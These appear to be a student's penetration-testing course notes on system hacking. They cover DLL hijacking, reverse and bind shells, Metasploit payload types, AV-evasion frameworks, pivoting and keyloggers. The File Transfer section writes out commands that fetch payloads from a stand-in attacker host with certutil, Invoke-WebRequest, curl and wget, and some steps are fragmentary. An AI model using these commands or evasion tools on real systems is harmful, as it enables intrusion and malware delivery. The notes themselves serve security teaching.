- What is System Hacking
- How to do system Hacking
- Remote Shell Access
- Web server
- Common Vulnerabilities and Exposure
- Vulnerability Assessment
- Metasploit
- Port forwarding
- Pivoting and Privilege
- Escalation
- Steganography
- keylogging

## What is system hacking

**System hacking** is the practice of gaining unauthorized access to a computer system or network.
Hackers use various techniques to exploit vulnerabilities and gain control over a system, often with malicious intent.  
To do so we need to have deep understanding about how OS and some protocol works.
Here are some common methods used in system hacking:  [[S2Day4]]

- **Password cracking:** Guessing or brute-forcing passwords to gain access.  
- **Social engineering:** Manipulating people into revealing sensitive information.  
- **Phishing:** Sending deceptive emails or messages to trick users into clicking malicious links or downloading malware.  
- **Malware attacks:** Using malicious software to infect systems and steal data or disrupt operations.  
- Network attack: vulnerabilities in network infrastructure to gain access to systems.  
#### Linux System Hacking
- GNU/Linux is operating system(os) assembled user model and it is open source to use and secure to be Hacked/exploited. but attackers can get some vulnerabilities to the system and exploit it.
- using the following technique
> [what is shadow file]
> 	
> 	The **Linux shadow file** is a critical system file that stores encrypted passwords for user accounts. Its primary purpose is to protect the security of user passwords by preventing unauthorized access and disclosure.

 -  - Hack Linux Using Shadow files
 - SSH key leak
 - Remote Code Execution(RCE)
 - Privilege Escalation
 - bug detection
#### Windows System Hacking

## **DLL Hijacking**
is a security vulnerability that occurs when an attacker replaces a legitimate DLL file with a malicious one. This can lead to various attacks, such as executing arbitrary code or stealing sensitive information.

**How it works:**

1. **Identify a vulnerable application:** The attacker finds an application that loads DLL files from a predictable location, such as the application's directory or a system directory.
2. **Create a malicious DLL:** The attacker creates a malicious DLL with the same name as a legitimate DLL used by the application.
3. **Place the malicious DLL:** The attacker places the malicious DLL in a location that the application searches for DLL files before the legitimate location.
4. **Execute the application:** When the application is executed, it loads the malicious DLL instead of the legitimate one, allowing the attacker to execute malicious code.
**Prevention:**
- **Restrict DLL loading:** Configure applications to load DLL files from specific locations only.
- **Use application isolation:** Run applications in isolated environments to prevent malicious DLLs from affecting other parts of the system.
- **Keep software up-to-date:** Apply security patches and updates to address known vulnerabilities.

## Powershell Scripting and Usage

**Power-shell** is a powerful scripting language built into Windows that can be used to automate tasks, manage systems, and perform various administrative functions.
**Key features:**
- **Object-oriented:** Power-shell treats everything as an object, making it easier to manipulate and combine data.
- **Pipeline:** Powershell uses a pipeline to pass data between commands, enabling efficient processing.
- **Remoting:** Powershell can be used to manage remote systems over a network.
**Common uses:**
- **System administration:** Managing users, groups, services, and other system components.
- **Automation:** Creating scripts to automate repetitive tasks.
- **Security:** Performing security audits, vulnerability assessments, and incident response.

## Managing Services, Users, and Active Directory

**Managing Services:**
- **Start, stop, and restart services:** Use the `sc` command or the Services console to manage services.
- **Configure service properties:** Set startup type, log on credentials, and other properties.
**Managing Users:**

- **Create, modify, and delete users:** Use the `net user` command or the Users and Groups console.
- **Assign user rights and permissions:** Grant users access to specific resources and perform specific tasks.

**Active Directory:**
- **Centralized user and group management:** Store and manage user and group information in a centralized database.
- **Domain management:** Create, manage, and configure domains.
- **Group Policy:** Implement and enforce organizational policies and settings.
- **Security and authentication:** Provide authentication services and security features.

By understanding these fundamental concepts, you can effectively manage your Windows systems and protect them from security threats.

### Remote Shell Access
- A shell is an interpreter between our command and the kernel.
- Based on the access we have to the shell we classified them into two: 
		-Bind shell
		-Reverse Shell
- Bind shell remote consoles are establishes with other computers over the network.	
- In a bind shell, an attacker can connect to the target computer and execute commands on the target computer. 
To launch a bind shell, the attacker must have the IP address of the victim to access the target computer.
- A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system's vulnerabilities to initiate a shell session and then access the victim's computer.
- Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the target machine. 
- Therefore it is a severe security threat.
- This method is also commonly used in penetration tests
- It can be made by sending malware link the link called **Payload.
##### Netcat/nc
- is a cli tool that is used to read / write data over TCP/UDP 
- used to listen ports to establish connection on port, used for back door opener for other programs ,to crate Reverse shells or Bind shells.
##### Payloads
- are the sequence of action after detection of vulnerability.
- are code or command that are passed to the target system to perform specific action, like gaining control, steel passwords, damaging data.

### Web servers

- On the hardware side, a web server is a computer that stores web server software and a website's component files (for example, HTML documents, images, CSS stylesheets, and JavaScript files). 
- A web server connects to the Internet and supports physical data interchange with other devices connected to the web.
- Web Server Software is a computer software that uses HTTP and HTTPS to provide a website.(port 80,443)
- There are a lot of softwares that can be installed on the server to work like web server
- As we talked previously, servers are just computers. So to be specific and talk about web server, we have to install some web things.
    A. **Apache server
- This Server software will help to provide Web contents.
- On linux it comes Built in
- But on windows you can install it with softwares called Xampp and Wampp and will give you localhost web contents
- To Start this server software
- From now on our computer is acting like a webserver.
- Configuration File /etc/apache2/apache2.conf
- Log File: /var/log/apache2/access.log 
Port Config File: /etc/apache2/ports.conf.
- By going to the ip address , we can get to the web site .
   B. Nginx Server
- NGINX (pronounced "engine-x") is a high-performance web server, reverse proxy server, and load balancer. 
- It's widely used for serving static content, acting as a reverse proxy for dynamic content, and improving the scalability and performance of websites and web applications.
- To start the server:
    
```
   sudo systemctl start nginx
```
- To check status :
- Config file: /etc/nginx/nginx.conf
- Log File: /var/log/nginx/access.log
	C. Python Server
- The python will help you to host website from any path on your computer with any port you need.
- To start the service
     -  python3 -m http.server port Number.
---
## Common Vulnerabilities and Exposures / CVE

- is a system of identifying vulnerabilities and scoring them according to their threat to systems.

> [!NOTE]
> - It is maintained by the MITRE Corporation with funding from the US Division of Homeland Security. 

- MITRE is a non-profit organization that operates multiple federally funded research and development centers (FFRDCs) in the United States. 
- It supports government agencies in fields like cybersecurity, defense, healthcare, and homeland security
- Contributions
- MITRE ATT&CK Framework: ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally recognized cybersecurity framework developed by MITRE. It details the various tactics and techniques adversaries use during cyberattacks, mapped across different phases of an attack lifecycle (like initial access, persistence, privilege escalation, etc.).
- CVE
> 

- Vulnerabilities are collected and cataloged using the Security Content Automation Protocol (SCAP). 
SCAP evaluates vulnerability information and assigns each vulnerability a unique identifier.
***CVE-YEAR_ID
CVE-2024-22321



**![](https://lh7-rt.googleusercontent.com/slidesz/AGV_vUdcCzA-iONnQoPY36d94daiX61oM-v-d7WTmhnlrFPlMOa_x4Nw-ahc2SE-0XOSQVRl0lmVYPe6pWyn7XMHInHCtHMTANlLrK6ArS58Zs5t04ze5O3fy4IFajhvC4bK_a9cjIG99CJGH__5Asvzmj_TCC4lqFfi=s2048?key=8mMAvkAas6unH1DRvso-6A)**
### Vulnerability Assessment
- V0ulnerability assessment is a quick way to find potential security weaknesses in a system or network. Cyber security professionals use tools like Nessus, Acunetix, OpenVAS, and Nmap with NSE to scan for known vulnerabilities. This process focuses on identifying issues through checklists and does not involve actual attacks.

## Metasploit

-The Metasploit framework is a versatile tool that can be used by both ethical hackers and cybercriminals to identify and exploit vulnerabilities in networks and servers. It's written in Ruby and offers a vast library of exploits, payloads, auxiliaries, encoders, listeners, and post-exploitation tools. Exploits are used to compromise systems, while payloads execute commands on the compromised system. Auxiliaries aid in further scanning and reconnaissance. Encoders help to obfuscate payloads, and listeners wait for incoming connections from exploited systems. Post-exploitation tools allow attackers to maintain access and escalate privileges within the compromised system.
-After Successful Enumeration and scanning we can use Metasploit to gain and Maintain Access , Making Payloads, exploiting Vulnerabilities.

- Msfvenom:  A standalone tool for generating payloads and shellcode
- Msfconsole:  The primary Metasploit interface, which provides an interactive command-line interface to Metasploit.
- Msfdb: A command-line tool for managing the Metasploit database
    
    ###### shell Types:
- Meterpreter: An advanced, dynamically extensible payload that provides extensive functionality and a variety of post-exploitation features.
- Example: windows/meterpreter/reverse_tcp
- Shell: Provides basic command execution capabilities. Includes standard shell types like /bin/sh or /bin/bash on Unix-based systems and cmd.exe on Windows.
Example: linux/x86/shell_reverse_tcp
#### Payload Formatting

Operating Systems (OS)
- Windows: Payloads designed to work with Windows operating systems.
- Example: windows/meterpreter/reverse_tcp
- Linux: Payloads intended for Linux systems.
- Example: linux/x86/meterpreter/reverse_tcp
- macOS: Payloads for macOS systems.
- Example: osx/x86/shell_reverse_tcp
- Android: Payloads for Android devices.
- Example: android/meterpreter/reverse_tcp
- FreeBSD: Payloads for FreeBSD systems.
Example: freebsd/x86/meterpreter/reverse_tcp

Connection Types:
- Reverse TCP: The payload connects back to the attacker’s machine. Commonly used to bypass network security measures like firewalls and NAT.
    

- Example: windows/meterpreter/reverse_tcp
    

- Bind TCP: The payload listens on a specified port on the target machine, and the attacker connects to it. Useful when the attacker can’t receive incoming connections.
- Example: windows/meterpreter/bind_tcp
- Reverse HTTPS: Similar to reverse TCP, but uses HTTPS for encrypted communication.
- Example: windows/meterpreter/reverse_https
- Bind HTTPS: The payload listens for connections over HTTPS.
Example: windows/meterpreter/bind_https**

### **Staged vs. Non-Staged Payloads**
**Non-staged payloads** are self-contained and include all the necessary code to execute the desired action.
They are generally larger in size and more likely to be detected by antivirus software. However, they are often easier to use and can be more reliable.  
**The Shell and Connection part is connected with “-”**

**Staged payloads** are smaller in size and can be less likely to be detected by antivirus software. They work by sending a small initial payload (stager) to the target system, which then downloads the full payload from the attacker's system. This can be more complex to set up, but it can also be more effective at evading detection.
**The Shell and Connection part is connected with “/”**

**In Linux, ELF (Executable and Linkable Format) is a common file format used for executable files, object code, shared libraries, and core dumps
o- refers to out put, f refers to file**

### Exploits on MSF

- Exploits are scripts or modules used to take advantage of vulnerabilities in a system. 
- Each exploit module in Metasploit is designed for a specific type of vulnerability and targets a particular operating system.
- The exploits are located in /usr/share/metasploit-framework/modules/exploits/
Exploit Example Formatting:
- Exploit: exploit/windows/smb/ms17_010_eternalblue
- OS: Windows
- Vulnerability: CVE-2017-0144 (EternalBlue)
- Exploit: exploit/linux/samba/is_known_pipename
- OS: Linux
Vulnerability: Samba SMB vulnerability.
- To start it you can type, 
- msfconsole
- msfconsole -q
- sudo msdb run


- Villain will give u powershell code
    
- It is Easy to create.
    
- Also You can use these 3 methods to make it undetectable.
    

- Other critical Framework that are heavily used by penetration testers during security assessments are 
- [Veil-Framework /Veil]([https://github.com/Veil-Framework/Veil](https://github.com/Veil-Framework/Veil) ) - Veil Framework 
- [Shellter]([https://www.shellterproject.com/download/](https://www.shellterproject.com/download/) ) - Shellter AV Evasion Artware
- [Unicorn]([https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn) ) - Trustedsec
- [MSFvenom Payload Creator (MSFPC)]([https://github.com/g0tmi1k/msfpc](https://github.com/g0tmi1k/msfpc) ) - g0tmi1k
- [Venom]([https://github.com/r00t-3xp10it/venom](https://github.com/r00t-3xp10it/venom))  - Pedro Ubuntu
- [Phantom-Evasion]([https://github.com/oddcod3/Phantom-Evasion](https://github.com/oddcod3/Phantom-Evasion) ) - Diego Cornacchini
- Empire
- These are not in the scope of this course, but feel free to research them in Your free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.
- Payload Creation is A part of a Malware development Field, To Go Further on Malware development, you have to learn Programming languages that run quickly and effective on any machines, Like:
- C
- C++
- Rust
    
## Payload on Wan

- As you saw we were trying the payloads on LAN network. Does it run on WAN?
- To do this we will need a thing called port forwarding.
Port forwarding inherently gives people outside of your network more access to your computer. Giving access or accessing unsafe ports can be risky, as threat actors and other people with malicious intents can then easily get full control of your device.

## File Transfer

- File transfer techniques allow attackers to upload payloads or exfiltrate sensitive data during post-exploitation.
- File Transferring Server: You can Start Python server and use it to download from it.
- To start python: python3 -m http.server 9090
- For Windows
- Invoke-WebRequest: iwr -Uri "http://example.com/payload.exe" -OutFile "payload.exe"
- CertUtil: certutil.exe -urlcache -split -f "http://example.com/payload.exe" payload.exe
- For Linux
- curl http://[attacker_ip]:8080/file --output file
- wget http://[attacker_ip]:8080/file.

## **Pivoting**

is a technique used in penetration testing where an attacker leverages a compromised system to gain access to other systems within a network. It's essentially a way to move laterally within a network, bypassing security measures that might prevent direct access.  

## **Privilege Escalation

privilege escalation attack is a cyberattack to gain illicit access of elevated rights, permissions, entitlements, or privileges beyond what is assigned for an identity, account, user, or machine.

## Steganography


- Steganography is the practice of hiding a secret message inside of (or even on top of) something that is not secret. 
- That something can be just about anything you want. 
- These days, many examples of steganography involve embedding a secret piece of text inside of a picture
- But also we can hide inside audio files and etc
- There are many tools for this.

- The famous on is “steghide”
    
### **Keylogging**

- Keyloggers are activity-monitoring software programs or hardware device that give hackers access to your personal data.
-  The passwords and credit card numbers you type, the web pages you visit – all by logging your keyboard strokes.
- The software is installed on your computer, and records everything you type.